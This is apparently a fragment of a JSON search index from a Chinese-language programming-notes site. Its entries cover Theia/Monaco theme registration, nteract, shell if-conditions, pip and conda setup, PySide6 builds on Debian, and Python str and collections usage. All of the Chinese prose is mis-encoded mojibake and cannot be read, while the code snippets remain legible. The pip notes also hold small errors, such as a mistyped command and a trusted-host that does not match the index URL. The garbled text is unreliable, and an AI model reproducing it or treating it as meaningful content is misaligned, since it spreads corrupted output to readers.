node_modules/@theia/monaco-editor-core/src/vs/editor/standalone/browser/standaloneEditor.ts ä¸‹çš„è¿™ä¸¤: /** * Define a new theme or update an existing theme. */ export function defineTheme(themeName: string, themeData: IStandaloneThemeData): void { const standaloneThemeService = StandaloneServices.get(IStandaloneThemeService); standaloneThemeService.defineTheme(themeName, themeData); } /** * Switches to a theme. */ export function setTheme(themeName: string): void { const standaloneThemeService = StandaloneServices.get(IStandaloneThemeService); standaloneThemeService.setTheme(themeName); } ç†ä¸€ä¸‹ ä¸»é¢˜ ä¸ é¢œè‰² çš„åŒºåˆ« ä¸»é¢˜åŒ…å«é¢œè‰², ä¸é¢œè‰²å®šä¹‰, ä½†æ˜¯ä½¿ç”¨çš„æ—¶å€™, æ˜¯æ ¹æ®æ³¨å†Œäº†å“ªäº›é¢œè‰², ä½¿ç”¨ä¸»é¢˜é‡Œçš„é¢œè‰². å³ åªæœ‰é€šè¿‡ node_modules/@theia/core/src/browser/color-application-contribution.ts çš„ ColorContribution è´¡çŒ®ç‚¹çš„ registerColors æ³¨å†Œçš„é¢œè‰². ä¸‹é¢çš„ colors æ‰èƒ½ç”Ÿæ•ˆ: { \"$schema\": \"vscode://schemas/color-theme\", \"name\": \"Dark (Custom)\", \"colors\": { \"ideC.editor.background\": \"#1E1E1E\", \"ideC.editor.foreground\": \"#D4D4D4\", ... é™¤éæ˜¯å†…éƒ¨å·²ç»æ³¨å†Œçš„. vscodeä¸»é¢˜ä¸theiaä¸»é¢˜çš„åŒºåˆ« é»˜è®¤æƒ…å†µä¸‹, vscodeåªä¼šå¤„ç†vscodeç›¸å…³çš„æ ·å¼. StandaloneThemeService ä¸Šå°±æ˜¯è¿™æ ·å®ä¾‹: function getBuiltinRules(builtinTheme: BuiltinTheme): IStandaloneThemeData { switch (builtinTheme) { case VS_LIGHT_THEME_NAME: return vs; case VS_DARK_THEME_NAME: return vs_dark; case HC_BLACK_THEME_NAME: return hc_black; case HC_LIGHT_THEME_NAME: return hc_light; } } function newBuiltInTheme(builtinTheme: BuiltinTheme): StandaloneTheme { const themeData = getBuiltinRules(builtinTheme); return new StandaloneTheme(builtinTheme, themeData); } å³åªå¤„ç†è¿™å››ä¸ªä¸»é¢˜. å¦å¤–è¿˜æœ‰ä¸€ä¸ª StandaloneThemeService å†…çš„ defineTheme : public defineTheme(themeName: string, themeData: IStandaloneThemeData): void { if (!/&#94;[a-z0-9\\-]+$/i.test(themeName)) { throw new Error('Illegal theme name!'); } if (!isBuiltinTheme(themeData.base) && !isBuiltinTheme(themeName)) { throw new Error('Illegal theme base!'); } // set or replace theme this._knownThemes.set(themeName, new StandaloneTheme(themeName, themeData)); ... } è¿™é‡Œ this._knownThemes ä¹Ÿä¼šå®ä¾‹ä¸€ä¸ªæ–°çš„. è€Œè°ƒç”¨åˆ°è¿™çš„æ¡ä»¶è¿˜æ˜¯ node_modules/@theia/monaco/src/browser/textmate/monaco-theme-registry.ts ä¸‹ register çš„: register(json: any, includes?: { [includePath: string]: any }, givenName?: string, monacoBase?: monaco.editor.BuiltinTheme): ThemeMix { const name = givenName || json.name!; ... if (monacoBase && givenName) { ... } ... } ä»è¿™ä¸€ç‚¹çœ‹, å¾ˆå¤šæ ·å¼åœ¨æ³¨å†Œä¸»é¢˜çš„æ—¶å€™, åªè¦å®šä¹‰äº† monacoBase æ˜¯åŸºäºvsçš„, å°±ä¼šåŒæ—¶åŒ…å« --theia-xxx ä¸ --vscode-xxx . ä¸è¿‡åªæœ‰setThemeæ‰ä¼šè§¦å‘ --vscode-xxx çš„ç”Ÿæˆ, ç®—æ˜¯ä¸€ç§æ‡’åŠ è½½. åŒæ—¶, ç”±äºåŠ è½½é¡ºåºçš„åŸå› , å¾€å¾€é¦–æ¬¡åŠ è½½åªä¼šç”Ÿæˆvsä¸»é¢˜çš„ --vscode-xxx æ ·å¼, å› ä¸ºè¿™ä¸ªæ—¶å€™ colors è¿˜æ²¡æœ‰æ³¨å†Œä¸Šå», è€Œæ³¨å†Œ colors æ—¶, å› ä¸ºä¸»é¢˜å·²ç»è®¾ç½®å¥½äº†, å°±ä¸ä¼šå† settheme ç”Ÿæˆ --vscode-xxx æ ·å¼äº†, é™¤éæ‰‹åŠ¨åˆ‡æ¢ä¸€ä¸‹ä¸»é¢˜. æ•…, è‡ªå®šä¹‰çš„é¢œè‰², è¿˜æ˜¯ä½¿ç”¨ --theia-xxx æ¥ä½¿ç”¨ æ³¨æ„, æ³¨å†Œä¸»é¢˜ä¸æ³¨å†Œé¢œè‰²æ˜¯ä¸¤ä¸ªè°ƒç”¨","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Multi--themed.html","loc":"/yq-doc-source-docs-front-end-frame-theia-Technical-realization-Multi--themed.html"},{"title":"nodeä¸‰æ–¹åº“","text":"lodash AnchorJS ajv nteract","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-node-Three--party-library-index.html","loc":"/yq-doc-source-docs-front-end-node-Three--party-library-index.html"},{"title":"nteract","text":"å®‰è£…: npm install -g nteract # yarn global add nteract æ³¨è§£ è‹¥æƒ³ç›´æ¥ä»æºç å¯åŠ¨: git clone https://github.com/nteract/nteract.git cd nteract yarn install yarn start åŠŸèƒ½: ä¸€ä¸ªæ¯”è¾ƒé«˜çº§ç‚¹çš„nodeäº¤äº’ç¯å¢ƒ. ä¸åŸç”Ÿnodeçš„åŒºåˆ«, ç±»ä¼¼äº ipython ä¸ python å¯åŠ¨: nteract ä¹Ÿæ”¯æŒå…¶ä»–è¯­è¨€ å¯é€‰å®‰è£…Python kernel NteractåŸç”Ÿæ”¯æŒJavaScript/Node.js,ä½†å¯ä»¥é€šè¿‡é¢å¤–çš„kernel packagesæ·»åŠ Pythonç­‰å…¶ä»–è¯­è¨€æ”¯æŒ: pip install ipython pip install nteract-kernel","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-node-Three--party-library-nteracat.html","loc":"/yq-doc-source-docs-front-end-node-Three--party-library-nteracat.html"},{"title":"shellæ¡ä»¶åˆ¤æ–­if","text":"åœ¨æ¡ä»¶è¡¨è¾¾å¼ä¸­è¿›è¡Œå­—ç¬¦ä¸²/æ•°å€¼æ¯”è¾ƒ å­—ç¬¦ä¸²/æ•°å€¼åˆ¤æ–­(å­—ç¬¦ä¸²åˆ¤æ–­æ—¶, shellä¸€ä¸ªç­‰å·ä¸ä¸¤ä¸ªç­‰å·çš„æ•ˆæœæ˜¯ä¸€è‡´çš„): str1 < str2 str1 æ’åˆ—åœ¨ str2 ä¹‹å‰ï¼ˆå–å†³äºè¯­è¨€ç¯å¢ƒï¼‰ str1 > str2 str1 æ’åˆ—åœ¨ str2 ä¹‹åï¼ˆå–å†³äºè¯­è¨€ç¯å¢ƒï¼‰ str1 = str2 å½“ä¸¤ä¸ªä¸²æœ‰ç›¸åŒå†…å®¹ã€é•¿åº¦æ—¶ä¸ºçœŸ str1 != str2 å½“ä¸²str1å’Œstr2ä¸ç­‰æ—¶ä¸ºçœŸ -n str1 å½“ä¸²çš„é•¿åº¦å¤§äº0æ—¶ä¸ºçœŸ(ä¸²éç©º) -z str1 å½“ä¸²çš„é•¿åº¦ä¸º0æ—¶ä¸ºçœŸ(ç©ºä¸²) str1 å½“ä¸²str1ä¸ºéç©ºæ—¶ä¸ºçœŸ int1 -eq int2 ä¸¤æ•°ç›¸ç­‰ä¸ºçœŸ int1 -ne int2 ä¸¤æ•°ä¸ç­‰ä¸ºçœŸ int1 -gt int2 int1å¤§äºint2ä¸ºçœŸ int1 -ge int2 int1å¤§äºç­‰äºint2ä¸ºçœŸ int1 -lt int2 int1å°äºint2ä¸ºçœŸ int1 -le int2 int1å°äºç­‰äºint2ä¸ºçœŸ åœ¨æ¡ä»¶è¡¨è¾¾å¼ä¸­è¿›è¡Œæ–‡ä»¶æ¯”è¾ƒ æ–‡ä»¶åˆ¤æ–­: -r file ç”¨æˆ·å¯è¯»ä¸ºçœŸ -w file ç”¨æˆ·å¯å†™ä¸ºçœŸ -x file ç”¨æˆ·å¯æ‰§è¡Œä¸ºçœŸ -f file æ–‡ä»¶ä¸ºæ™®é€šæ–‡ä»¶ä¸ºçœŸ -d file æ–‡ä»¶ä¸ºç›®å½•ä¸ºçœŸ -c file æ–‡ä»¶ä¸ºå­—ç¬¦ç‰¹æ®Šæ–‡ä»¶ä¸ºçœŸ -b file æ–‡ä»¶ä¸ºå—ç‰¹æ®Šæ–‡ä»¶ä¸ºçœŸ -s file æ–‡ä»¶å¤§å°é0æ—¶ä¸ºçœŸ -t file å½“æ–‡ä»¶æè¿°ç¬¦(é»˜è®¤ä¸º1)æŒ‡å®šçš„è®¾å¤‡ä¸ºç»ˆç«¯æ—¶ä¸ºçœŸ -L file æ–‡ä»¶å­˜åœ¨ç¬¦å·é“¾æ¥ä¸ºçœŸ -e file æ–‡ä»¶æ˜¯å¦å­˜åœ¨ -S file å­˜åœ¨ Socket æ–‡ä»¶ -p file å­˜åœ¨ä¸”ä¸º FIFOï¼ˆpipeï¼‰æ–‡ä»¶ file1 -nt file2 file1 æ˜¯å¦æ¯” file2 æ–° file1 -ot file2 file1 æ˜¯å¦æ¯” file2 æ—§ file1 -ef file2 file1 å’Œ file2 ä½äºç›¸åŒçš„è®¾å¤‡ä¸Šå¹¶ä¸”æœ‰ç›¸åŒçš„ inode ç¼–å· åˆ¤æ–­ç¬¦å·: -a ä¸ -o æˆ– ! é ä¾‹, æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰çš„åŠæ³•: if [ \"$test\"x = \"test\"x ]; then è¿™é‡Œçš„å…³é”®æœ‰å‡ ç‚¹ï¼š ä½¿ç”¨å•ä¸ªç­‰å· æ³¨æ„åˆ°ç­‰å·ä¸¤è¾¹å„æœ‰ä¸€ä¸ªç©ºæ ¼ï¼šè¿™æ˜¯unix shellçš„è¦æ±‚ æ³¨æ„åˆ°\"$test\"xæœ€åçš„xï¼Œè¿™æ˜¯ç‰¹æ„å®‰æ’çš„ï¼Œå› ä¸ºå½“$testä¸ºç©ºçš„æ—¶å€™ï¼Œä¸Šé¢çš„è¡¨è¾¾å¼å°±å˜æˆäº†x = testxï¼Œæ˜¾ç„¶æ˜¯ä¸ç›¸ç­‰çš„ã€‚è€Œå¦‚æœæ²¡æœ‰è¿™ä¸ªxï¼Œè¡¨è¾¾å¼å°±ä¼šæŠ¥é”™ï¼š [: =: unary operator expected ä¸å¸¦ifçš„å†™æ³• æ¡ä»¶è¯­æ³•: command && if_success_run_this_command_too || true command || if_not_success_run_this_command_too || true å¦‚ä¸‹æ‰€ç¤ºæ˜¯å¤šè¡Œè„šæœ¬ç‰‡æ®µ: if [ conditional_expression ]; then if_success_run_this_command else if_not_success_run_this_command fi è¿™é‡Œæœ«å°¾çš„ || true æ˜¯éœ€è¦çš„ï¼Œ å®ƒå¯ä»¥ä¿è¯è¿™ä¸ª shell è„šæœ¬åœ¨ä¸å°å¿ƒä½¿ç”¨äº† -e é€‰é¡¹è€Œè¢«è°ƒç”¨æ—¶ä¸ä¼šåœ¨è¯¥è¡Œæ„å¤–åœ°é€€å‡º","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-shell-condition-judgment-if.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-shell-condition-judgment-if.html"},{"title":"åŒ…ç®¡ç†å™¨","text":"pip å¸¸ç”¨å®‰è£…é€‰é¡¹ install <package> uninstall <package> show <package> list <package> å¸¸ç”¨å‚æ•° -t å®‰è£…æ—¶, æŒ‡å®šå®‰è£…ç›®å½• -U , --upgrade å‡çº§å®‰è£…, ä½¿ç”¨ä¸æ­£å¸¸çš„åŒ…å‡çº§ä¸åŒç‰ˆæœ¬è¦†ç›–å®‰è£… æŸ¥çœ‹é…ç½®é¡¹æ‰€åœ¨é…ç½®æ–‡ä»¶è·¯å¾„: pip -v config list Debianä¸‹é…ç½®å®‰è£… Linuxç”±äºç³»ç»Ÿå†…ç½®Pythonçš„ç¼˜æ•…, å¤šå°‘æœ‰ç‚¹ä¸åŒ. Debianä¸‹å¦‚æœæ²¡æœ‰pip, å¯ä»¥ä½¿ç”¨aptå®‰è£…: apt install python-pip # py2ä½¿ç”¨ apt install python3-pip # py3ä½¿ç”¨ æ³¨æ„è¿™å®‰è£…çš„æ˜¯äºç³»ç»Ÿé»˜è®¤PythonåŒ¹é…çš„ç‰ˆæœ¬ é…ç½®pipæºåŸºæœ¬ä¸€è‡´ï¼ˆéœ€è¦è‡ªå®šä¹‰æ‰é…ç½®ï¼Œé»˜è®¤å›½å¤–çš„å¤ªæ…¢ï¼‰, åœ¨ç”¨æˆ·ç›®å½•ä¸‹åˆ›å»º ~/.pip/pip.conf é…ç½®æ–‡ä»¶ï¼Œå†…å®¹: [global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple # index-url = http://pypi.douban.com/simple # è±†ç“£æº;å¯ä»¥æ¢æˆå…¶ä»–çš„æº disable-pip-version-check = true # å–æ¶ˆpipç‰ˆæœ¬æ£€æŸ¥&#xff0c;æ’é™¤æ¯æ¬¡éƒ½æŠ¥æœ€æ–°çš„pip timeout = 120 [install] trusted-host = pypi.tuna.tsinghua.edu.cn # trusted-host = pypi.douban.com # æ·»åŠ è±†ç“£æºä¸ºå¯ä¿¡ä¸»æœº&#xff0c;è¦ä¸ç„¶å¯èƒ½æŠ¥é”™ æˆ–è€…æ‰§è¡Œçš„æ—¶å€™ç›´æ¥æŒ‡å®š: pip instal soft -i \"https://pypi.tuna.tsinghua.edu.cn/simple\" --trusted-host pypi.douban.com Macé…ç½®pipæº cd ~ mkdir .pip && cd .pip echo \"[global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple [install] trusted-host=pypi.douban.com \" >pip.conf æ³¨è§£ å…¶ä»–æº https://mirrors.aliyun.com/pypi/simple/ # é˜¿é‡Œäº‘ https://pypi.douban.com/simple/ # è±†ç“£ https://pypi.tuna.tsinghua.edu.cn/simple/ # æ¸…åå¤§å­¦ https://pypi.mirrors.ustc.edu.cn/simple/ # ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ Conda å¯ä»¥é€šè¿‡ä»¥ä¸‹åœ°å€ä¸‹è½½å¯¹åº”ç³»ç»Ÿçš„èµ„æºå®‰è£…: https://repo.anaconda.com/archive/ é¡¹ç›®githubåœ°å€: https://github.com/conda æŸ¥çœ‹æœ‰å“ªäº›ç¯å¢ƒ: conda env list åˆ›å»ºæŒ‡å®šPythonç‰ˆæœ¬çš„ç¯å¢ƒ: conda create --name py37 python=3.7 å¤åˆ¶ç¯å¢ƒpy37ä¸ºä¸€ä¸ªæ–°çš„py379: conda create -n py379 --clone py37 åˆ é™¤ç¯å¢ƒ py379: conda remove -n py379 --all æ‰“åŒ…ä¸ºç¦»çº¿ç¯å¢ƒ å…ˆå®‰è£…pack: conda install conda-pack # conda install -c conda-forge conda-pack ä¹Ÿå¯ä»¥pipå®‰è£…: pip install conda-pack ä¸‹é¢ä»¥å¯¼å‡º venv-py379 ä¸ºä¾‹ æ–°å»ºæ­¤ç¯å¢ƒ: conda create --name venv-py379 python=3.7.9 æ¿€æ´»ç¯å¢ƒ: conda activate venv-py379 å®‰è£…pack: conda install conda-pack æ‰“åŒ…ä¸º py379.tar.gz : conda pack -n venv-py379 -o py379.tar.gz ç›®æ ‡æœºå™¨ä¸Šä½¿ç”¨ py379.tar.gz åˆ›å»ºè™šæ‹Ÿç¯å¢ƒæ‰€åœ¨ç›®å½•å¹¶è§£å‹: mkdir venv-py379 tar -xzf py379.tar.gz -C venv-py379 æ¿€æ´»ç¯å¢ƒ: . ./venv-py379/bin/activate æ¸…é™¤å‰ç¼€: conda-unpack æ¸…é™¤å‰ç¼€æ˜¯å› ä¸ºå¯èƒ½æœ‰äº›åº“å•Šä»€ä¹ˆçš„å…è®¸ä¼šä¾èµ–æœ‰å…¶ä»–è·¯å¾„çš„ä¸œè¥¿, ä¸æ¸…é™¤åé…ç½®ä¸ºè‡ªå·±condaçš„ç”¨ä¸äº† æ³¨è§£ ä¹Ÿæ”¯æŒAPIä½¿ç”¨: import conda_pack # æŠŠè™šæ‹Ÿç¯å¢ƒ my_env æ‰“åŒ…ä¸º my_env.tar.gz conda_pack.pack(name=\"my_env\") # -o å‚æ•°æŒ‡å®šæ‰“åŒ…è·¯å¾„å’Œåç§°ï¼ŒæŠŠè™šæ‹Ÿç¯å¢ƒ my_env æ‰“åŒ…ä¸º out_name.tar.gz conda_pack.pack(name=\"my_env\", output=\"out_name.tar.gz\") # æŠŠæŸä¸ªç‰¹å®šè·¯å¾„çš„è™šæ‹Ÿç¯å¢ƒæ‰“åŒ…ä¸º my_env.tar.gz conda_pack.pack(prefix=\"/explicit/path/to/my_env\") conda_packæ–‡æ¡£: https://conda.github.io/conda-pack/cli.html æ‰“åŒ…ä¸ºé…ç½® æ¿€æ´»ç¯å¢ƒå: conda env export > py379.yaml ç„¶åå°†è¿™ä¸ªyamlå¤åˆ¶åˆ°ç›®æ ‡æœºå™¨: conda env create -f py379.yaml","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Bag-manager.html","loc":"/yq-doc-source-docs-rear-end-python-Bag-manager.html"},{"title":"str","text":"python3ä¸€ä¸ªæ–°ç‰¹æ€§å°±æ˜¯å¯¹æ–‡æœ¬å’ŒäºŒè¿›åˆ¶åšäº†æ›´æ¸…æ™°çš„åˆ’åˆ†ï¼Œ æ–‡æœ¬æ˜¯strï¼ŒäºŒè¿›åˆ¶æ˜¯byte(x01x06...) ç¼–ç : encodeï¼šstr --> byte è§£ç : decodeï¼šbyte --> str join: ''.join(list) #å°†listè½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä»¥''ä¸­å®šä¹‰çš„å­—ç¬¦ä¸²åˆ†éš” str.split: str.split('') #å°†strä»¥''ä¸­å®šä¹‰çš„åˆ†éš”ä¸ºæ•°ç»„ rpartition, ä»å³è¾¹ç¬¬ä¸€ä¸ªæŒ‡å®šçš„å­—ç¬¦å¼€å§‹åˆ†éš”: #!/usr/bin/python str = \"www.runoob.com\" print str.rpartition(\".\") # ('www.runoob', '.', 'com') æ•°å­—æ“ä½œ hex(), 10è¿›åˆ¶æ•´æ•°è½¬æ¢æˆ16è¿›åˆ¶ å­—ç¬¦ä¸²çš„æ‹¼æ¥ä½¿ç”¨join å­—ç¬¦ä¸²çš„æ‹¼æ¥æœ‰ä¸¤ç§æ–¹å¼ - + å¦‚æœæœ‰nä¸ªå­—ç¬¦ä¸²éœ€è¦æ‹¼æ¥ï¼Œå°±ä¼šè¿›è¡Œn-1æ¬¡å†…å­˜ç©ºé—´ç”³è¯· - join åªä¼šè¿›è¡Œä¸€æ¬¡ç©ºé—´ç”³è¯·ï¼Œç”³è¯·æ—¶ä¼šç»Ÿè®¡æ‰€æœ‰å­—ç¬¦ä¸²çš„ä¸ªæ•°ï¼Œä»¥åŠæ€»çš„é•¿åº¦ã€‚å†é€ä¸€è¿›è¡Œå­—ç¬¦ä¸²çš„æ‹·è´ æ±‚å…¶ä¸­æŸå€¼çš„ä¸ªæ•° ä½¿ç”¨ count, å¦‚: In [22]: \"1110\".count(\"1\") Out[22]: 3 zfill å­—ç¬¦ä¸²æŒ‡å®šé•¿åº¦, å·¦ä¾§è¡¥0: In [4]: \"123\".zfill(5) Out[4]: '00123' ljust å­—ç¬¦ä¸²æŒ‡å®šé•¿åº¦, å·¦ä¾§å¯¹é½, å³ä¾§è¡¥å……æŒ‡å®šå­—ç¬¦ å¦‚å·¦å¯¹é½, å³ä¾§è¡¥0: In [2]: \"123\".ljust(5, \"0\") Out[2]: '12300' rjust å­—ç¬¦ä¸²æŒ‡å®šé•¿åº¦, å³ä¾§å¯¹é½, å·¦ä¾§è¡¥å……æŒ‡å®šå­—ç¬¦ å¦‚å³å¯¹é½, å·¦ä¾§è¡¥0: In [3]: \"123\".rjust(5, \"0\") Out[3]: '00123' lower å°†å­—ç¬¦ä¸²å…¨éƒ¨è½¬æ¢ä¸ºå°å†™ upper å°†å­—ç¬¦ä¸²å…¨è½¬æ¢ä¸ºå¤§å†™ title å°†å­—ç¬¦ä¸²é¦–å­—æ¯å¤§å†™","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-STR.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-STR.html"},{"title":"debianä¸‹çš„å®‰è£…","text":"ä½¿ç”¨dockeré…ç½®, è§: /docs/æ“ä½œç³»ç»Ÿ/linux/debian/é…ç½®debianå®¹å™¨ å®‰è£… Python3 å¿…è¦çš„åŒ…: apt install python3 python3-pip python3-venv vim é…ç½® pip è±†ç“£æº: cd ~ mkdir .pip && cd .pip echo \"[global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple # index-url = https://pypi.douban.com/simple/ [install] trusted-host=pypi.tuna.tsinghua.edu.cn # trusted-host=pypi.douban.com \" >pip.conf å®˜ç½‘è¦æ±‚å®‰è£…çš„ä¾èµ–åŒ…: apt install libgl-dev python3-dev python3-distutils python3-setuptools é…ç½®è™šæ‹Ÿç¯å¢ƒ: python3 -m venv dev_venv . dev_venv/bin/activate æ‹‰å»æºç å¹¶æ„å»º: apt install git cmake mkdir project && cd project git clone https://code.qt.io/pyside/pyside-setup cd pyside-setup && git checkout 6.4 && pip install -r requirements.txt python setup.py build --qtpaths=/opt/Qt/6.4.0/gcc_64/bin/qtpaths --build-tests --ignore-git --parallel=8 python setup.py install --qtpaths=/opt/Qt/6.4.0/gcc_64/bin/qtpaths --build-tests --ignore-git --parallel=8 æ•´ä½“æºç :","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Installation-under-Debian.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Installation-under-Debian.html"},{"title":"collections","text":"deque é˜Ÿåˆ— åœ¨é˜Ÿåˆ—ä¸¤ç«¯æ’å…¥æˆ–åˆ é™¤å…ƒç´ æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯ O(1) åœ¨åˆ—è¡¨çš„å¼€å¤´æ’å…¥æˆ–åˆ é™¤å…ƒ ç´ çš„æ—¶é—´å¤æ‚åº¦ä¸º O(N) defaultdict å…·æœ‰é»˜è®¤å€¼çš„å­—å…¸ OrderedDict è‡ªæ’åºçš„å­—å…¸(ä¿æŒæ’å…¥æ—¶é¡ºåº) OrderedDict å†…éƒ¨ç»´æŠ¤ç€ä¸€ä¸ªæ ¹æ®é”®æ’å…¥é¡ºåºæ’åºçš„åŒå‘é“¾è¡¨ã€‚ æ¯æ¬¡å½“ä¸€ä¸ªæ–°çš„ å…ƒç´ æ’å…¥è¿›æ¥çš„æ—¶å€™ï¼Œå®ƒä¼šè¢«æ”¾åˆ°é“¾è¡¨çš„å°¾éƒ¨ã€‚ å¯¹äºä¸€ä¸ªå·²ç»å­˜åœ¨çš„é”®çš„é‡å¤èµ‹å€¼ä¸ä¼šæ”¹å˜é”®çš„é¡ºåºã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€ä¸ª OrderedDict çš„å¤§å°æ˜¯ä¸€ä¸ªæ™®é€šå­—å…¸çš„ä¸¤å€ï¼Œ å› ä¸ºå®ƒå†…éƒ¨ç»´ æŠ¤ç€å¦å¤–ä¸€ä¸ªé“¾è¡¨ã€‚ æ‰€ä»¥å¦‚æœä½ è¦æ„å»ºä¸€ä¸ªéœ€è¦å¤§é‡ OrderedDict å®ä¾‹çš„æ•°æ®ç»“æ„çš„ æ—¶å€™ (æ¯”å¦‚è¯»å– 100,000 è¡Œ CSV æ•°æ®åˆ°ä¸€ä¸ª OrderedDict åˆ—è¡¨ä¸­å»)ï¼Œ é‚£ä¹ˆä½ å°±å¾—ä»” ç»†æƒè¡¡ä¸€ä¸‹æ˜¯å¦ä½¿ç”¨ OrderedDict å¸¦æ¥çš„å¥½å¤„è¦å¤§è¿‡é¢å¤–å†…å­˜æ¶ˆè€—çš„å½±å“ã€‚ Counter è®¡ç®—å‡ºç°æ¬¡æ•° ä¸‹é¢æœ‰ä¸€ä¸ª most_common() è¿”å›å‡ºç°æ¬¡æ•°æœ€å¤šçš„: words = [ 'look', 'into', 'my', 'eyes', 'look', 'into', 'my', 'eyes', 'the', 'eyes', 'the', 'eyes', 'the', 'eyes', 'not', 'around', 'the', 'eyes', \"don't\", 'look', 'around', 'the', 'eyes', 'look', 'into', 'my', 'eyes', \"you're\", 'under' ] from collections import Counter word_counts = Counter(words) # å‡ºç°é¢‘ç‡æœ€é«˜çš„ 3 ä¸ªå•è¯ top_three = word_counts.most_common(3) print(top_three) # Outputs [('eyes', 8), ('the', 5), ('look', 4)] ä½œä¸ºè¾“å…¥ï¼ŒCounter å¯¹è±¡å¯ä»¥æ¥å—ä»»æ„çš„ç”±å¯å“ˆå¸Œ(hashable)å…ƒç´ æ„æˆçš„åºåˆ— å¯¹è±¡ã€‚ åœ¨åº•å±‚å®ç°ä¸Šï¼Œä¸€ä¸ª Counter å¯¹è±¡å°±æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œå°†å…ƒç´ æ˜ å°„åˆ°å®ƒå‡ºç°çš„æ¬¡æ•° ä¸Šã€‚æ¯”å¦‚: >>> word_counts['not'] 1 >>> word_counts['eyes'] 8 >>> åŒæ—¶ä¹Ÿæ”¯æŒæ•°å­¦è¿ç®—æ“ä½œ Counter å¯¹è±¡åœ¨å‡ ä¹æ‰€æœ‰éœ€è¦åˆ¶è¡¨æˆ–è€…è®¡æ•°æ•°æ®çš„åœºåˆæ˜¯éå¸¸æœ‰ç”¨çš„ å·¥å…·ã€‚ åœ¨è§£å†³è¿™ç±»é—®é¢˜çš„æ—¶å€™ä½ åº”è¯¥ä¼˜å…ˆé€‰æ‹©å®ƒï¼Œè€Œä¸æ˜¯æ‰‹åŠ¨çš„åˆ©ç”¨å­—å…¸å»å®ç°ã€‚ Counteræ±‚äº¤é›† æ±‚äº¤é›†(ä¸”ä¿ç•™æœ€å°å€¼) å‡è®¾ secret = \"1123\" ä¸” guess = \"0111\" ï¼Œ é‚£ä¹ˆ Counter(secret) ä¼šå¾—åˆ°: Counter({'1': 2, '2': 1, '3': 1}) è€Œ Counter(guess) ä¼šå¾—åˆ°: Counter({'0': 1, '1': 3}) å–å®ƒä»¬çš„äº¤é›†åå¾—åˆ°: # äº¤é›†åªæœ‰ 1, å–å…¶ä¸­å°çš„ä¸ªæ•° 2 Counter({'1': 2}) è¡¨ç¤ºåœ¨ secret å’Œ guess ä¸­éƒ½æœ‰çš„æ•°å­— 1 çš„æ•°é‡ä¸º 2ã€‚ total Counter().total()è¡¨ç¤ºå½“å‰æ€»çš„ä¸ªæ•°, æ¯”å¦‚: Counter({'1': 2, '2': 3}).total() == 5 namedtuple æ˜ å°„å…ƒç»„åˆ°å¯¹è±¡: >>> from collections import namedtuple >>> Subscriber = namedtuple('Subscriber', ['addr', 'joined']) >>> sub = Subscriber('jonesy@example.com', '2012-10-19') >>> sub Subscriber(addr='jonesy@example.com', joined='2012-10-19') >>> sub.addr 'jonesy@example.com' >>> sub.joined '2012-10-19' >>> è·Ÿå…ƒç»„ç±»å‹æ˜¯å¯äº¤æ¢ çš„ï¼Œæ”¯æŒæ‰€æœ‰çš„æ™®é€šå…ƒç»„æ“ä½œï¼Œæ¯”å¦‚ç´¢å¼•å’Œè§£å‹ã€‚æ¯”å¦‚: >>> len(sub) 2 >>> addr, joined = sub >>> addr 'jonesy@example.com' >>> joined '2012-10-19' å‘½åå…ƒç»„çš„ä¸€ä¸ªä¸»è¦ç”¨é€”æ˜¯å°†ä½ çš„ä»£ç ä»ä¸‹æ ‡æ“ä½œä¸­è§£è„±å‡ºæ¥ã€‚ å‘½åå…ƒç»„å¦ä¸€ä¸ªç”¨é€”å°±æ˜¯ä½œä¸ºå­—å…¸çš„æ›¿ä»£ï¼Œå› ä¸ºå­—å…¸å­˜å‚¨éœ€è¦æ›´å¤šçš„å†…å­˜ç©ºé—´ã€‚ æ³¨æ„ä¸€ä¸ªå‘½åå…ƒç»„æ˜¯ä¸å¯æ›´æ”¹çš„, å¦‚æœ‰ç‰¹æ®Šéœ€è¦, ä½¿ç”¨ _replace >>> s = Stock('ACME', 100, 123.45) >>> s Stock(name='ACME', shares=100, price=123.45) >>> s.shares = 75 Traceback (most recent call last): File \"<stdin>\", line 1, in <module> AttributeError: can't set attribute >>> >>> s = s._replace(shares=75) >>> s Stock(name='ACME', shares=75, price=123.45) >>> ChainMap é“¾å¼åˆå¹¶å­—å…¸. å‡å¦‚ä½ æœ‰å¦‚ä¸‹ä¸¤ä¸ªå­—å…¸: a = {'x': 1, 'z': 3 } b = {'y': 2, 'z': 4 } ç°åœ¨å‡è®¾ä½ å¿…é¡»åœ¨ä¸¤ä¸ªå­—å…¸ä¸­æ‰§è¡ŒæŸ¥æ‰¾æ“ä½œ(æ¯”å¦‚å…ˆä» a ä¸­æ‰¾ï¼Œå¦‚æœæ‰¾ä¸åˆ°å†åœ¨ b ä¸­æ‰¾)ã€‚ ä¸€ä¸ªéå¸¸ç®€å•çš„è§£å†³æ–¹æ¡ˆå°±æ˜¯ä½¿ç”¨ collections æ¨¡å—ä¸­çš„ ChainMap ç±»ã€‚æ¯”å¦‚: from collections import ChainMap c = ChainMap(a,b) print(c['x']) # Outputs 1 (from a) print(c['y']) # Outputs 2 (from b) print(c['z']) # Outputs 3 (from a) >>> len(c) 3 >>> list(c.keys()) ['x', 'y', 'z'] >>> list(c.values()) [1, 2, 3] >>> ä¸€ä¸ª ChainMap 